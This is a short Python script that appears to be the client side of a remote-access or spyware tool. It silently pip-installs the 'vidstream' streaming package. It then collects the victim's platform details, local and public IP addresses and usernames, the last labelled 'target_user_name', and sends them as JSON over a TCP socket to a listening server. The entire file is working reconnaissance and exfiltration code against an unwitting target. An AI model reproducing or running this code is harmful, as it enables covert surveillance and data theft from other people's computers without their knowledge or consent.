import json
import socket
import time, sys, os
import platform
import requests
import json
host = socket.gethostbyname(socket.gethostname())
port = 1827

try :
    import vidstream
except:
    os.system("pip install vidstream >> intall.txt && rm install.txt")

#platform info
def GettingInfoOfTheSystem(__server__): #it worke
    ALL_INFO = {
            "target_user_name" : "",
            "platform" : platform.system(),
            "machine" : platform.machine(),
            "node" : platform.node(),
            "architecture" : f"{platform.architecture()[0]} | {platform.architecture()[1]}",
            "version" : platform.version(),
            "processor" : platform.processor(),
            "release" : platform.release(),
            "host ip" : socket.gethostbyname(socket.gethostname()),
            "ip" : requests.get('https://api.ipify.org?format=json').json()["ip"]
            }
    """
        trying to get 
        the target user name
    """
    if platform.system() == 'Linux':
        NAME = os.listdir("/home")
        LIST_NAMES = "|"
        for x in NAME:
            LIST_NAMES += f" {x} |"
        ALL_INFO["target_user_name"] = LIST_NAMES
    elif platform.system() == "Windows" :
        ALL_INFO["target_user_name"] = os.getlogin()

    WHAT_TO_SEND = json.dumps(ALL_INFO)
    __server__.send(WHAT_TO_SEND.encode())



SERVER_TO_CONNECT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
SERVER_TO_CONNECT.connect((host,port))
GettingInfoOfTheSystem(__server__=SERVER_TO_CONNECT)